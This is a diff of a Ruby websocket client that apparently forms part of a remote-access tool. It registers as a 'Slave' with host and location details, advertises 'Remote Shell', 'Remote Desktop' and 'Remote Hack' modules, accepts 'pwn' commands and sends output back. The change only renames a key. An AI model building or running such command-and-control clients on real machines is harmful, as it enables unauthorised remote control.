@@ -9,7 +9,7 @@ EM.run {
   ws.on :open do |event|
     p [:open]
     #ws.send('{"header": "identification", "payload": {"id": "2", "type": "Slave", "name": "Android 22", "computer": "4tech-pc", "user": "verbatim", "os": "Linux", "ip": "192.168.1.2", "country": "Philippines", "city": "Minalin", "inators": [{"id": "1111", "name": "Remote Shell"}]}, "trailer": "whoami"}')
-    ws.send('{"header": "client", "payload": {"id": "10969", "type": "Slave", "name": "Android 22", "computer": "4tech-pc", "user": "verbatim", "os": "Linux", "ip": "192.168.1.2", "country": "Philippines", "city": "Minalin", "inators": [{"code": "1111", "name": "Remote Shell"}, {"code": "2222", "name": "Remote Desktop"}, {"code": "3333", "name": "Remote Hack"}]}, "trailer": "whoami"}')
+    ws.send('{"header": "android", "payload": {"id": "10969", "type": "Slave", "name": "Android 22", "computer": "4tech-pc", "user": "verbatim", "os": "Linux", "ip": "192.168.1.2", "country": "Philippines", "city": "Minalin", "inators": [{"code": "1111", "name": "Remote Shell"}, {"code": "2222", "name": "Remote Desktop"}, {"code": "3333", "name": "Remote Hack"}]}, "trailer": "whoami"}')
   end
 
   ws.on :message do |event|
@@ -17,7 +17,7 @@ EM.run {
     begin
       packet = JSON.parse(event.data)
       if packet['header'] == "pwn" then
-        client = packet['payload']['client']
+        client = packet['payload']['android']
         inator = packet['payload']['inator']
         data = packet['payload']['data']
         if inator == "1111" then
@@ -45,7 +45,7 @@ EM.run {
       packet = {
         "header" => "data",
         "payload" => {
-          "client" => "10969",
+          "android" => "10969",
           "inator" => "1111",
           "data" => "#{line}"
         },
@@ -66,7 +66,7 @@ EM.run {
       packet = {
         "header" => "data",
         "payload" => {
-          "client" => "10969",
+          "android" => "10969",
           "inator" => "2222",
           "data" => "#{line}"
         },
